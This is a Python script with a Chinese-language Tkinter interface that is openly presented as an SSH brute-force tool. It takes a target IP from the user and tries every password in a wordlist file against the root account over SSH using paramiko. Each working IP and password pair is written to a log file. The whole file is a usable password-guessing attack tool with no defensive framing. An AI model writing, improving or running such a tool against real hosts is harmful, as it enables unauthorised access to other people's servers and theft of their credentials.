import os
import paramiko
import threading
import time
import sys
from tkinter import *


class SSHThread(threading.Thread):
    def __init__(self, ip, port, timeout, dic, LogFile):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.dict = dic
        self.timeout = timeout
        self.LogFile = LogFile

    def run(self):
        global hostWorkText
        print("Start try ssh => %s" % self.ip)
        hostWorkText += "Start try ssh => %s" % self.ip
        username = "root"
        try:
            password = open(self.dict).read().split('\n')
        except:
            print("Open dict file `%s` error" % self.dict)
            exit(1)
        for pwd in password:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.ip, self.port, username, pwd, timeout=self.timeout)
                print("\nIP => %s, Login %s => %s \n" % (self.ip, username, pwd))
                hostWorkText += "\nIP => %s, Login %s => %s \n" % (self.ip, username, pwd)
                open(self.LogFile, "a").write("[ %s ] IP => %s, port => %d, %s => %s \n" % (
                    time.asctime(time.localtime(time.time())), self.ip, self.port, username, pwd))
                break
            except:
                print("IP => %s, Error %s => %s" % (self.ip, username, pwd))
                hostWorkText += "IP => %s, Error %s => %s" % (self.ip, username, pwd)
                pass


def ViolenceSSH(ip, port, timeout, dic, LogFile):
    ssh_scan = SSHThread(ip, port, timeout, dic, LogFile)
    ssh_scan.start()


def main(ip, dic, log):
    threading.Thread(target=ViolenceSSH, args=(ip, 22, 1, dic, log,)).start()


def help():
    print("python ssh.scan.py :\n\
        修改dict下的ip文件，password按需求修改，然后执行脚本。 \n")
    exit(1)


def begin():
    fpath = os.path.dirname(os.path.abspath('__file__'))
    ip = e1.get()
    dic = sys.argv[2] if len(sys.argv) > 2 else fpath + "\密码库.txt"
    log = sys.argv[3] if len(sys.argv) > 3 else fpath + "\配对成功的ip密码.txt"
    main(ip, dic, log)


hostWorkText = ''  # 装载结果最后输出
root = Tk()  # 生成主窗口
root.geometry('300x300')  # 改变窗体大小（‘宽x高’）
root.title('欢迎使用ssh爆破功能')  # 窗口名字
root.geometry('+960+300')  # 改变窗体位置（‘+横坐标+纵坐标’）
root.resizable(False, False)  # 将窗口大小设置为可变/不可变
la0 = Label(root, text='请输入想要爆破的ip地址').place(x=5, y=20)
img_gif = PhotoImage(file='img_gif.gif')
label_img = Label(root, image=img_gif).place(x=20, y=50)
# 第一个输入框位置功能
e1 = Entry(root)
e1.place(x=150, y=20)  # pack-包装 grid-网格 place-位置
e1.delete(0, END)  # 删除文本框里的值
e1.insert(0, '...')
# 两个按钮位置及功能
Button(root, text='爆破开始', width=10, command=begin).place(x=10, y=250)
Button(root, text='点击退出', width=10, command=root.destroy).place(x=200, y=250)
root2 = Tk()
root2.geometry('300x300')  # 改变窗体大小（‘宽x高’）
root2.title('结果窗口')  # 窗口名字
root2.geometry('+1260+300')  # 改变窗体位置（‘+横坐标+纵坐标’）
root2.resizable(True, True)  # 将窗口大小设置为可变/不可变
text = Text(root2, width=50, height=30, undo=True, autoseparators=True)
text.insert(INSERT, hostWorkText)
text.pack()
root.mainloop()
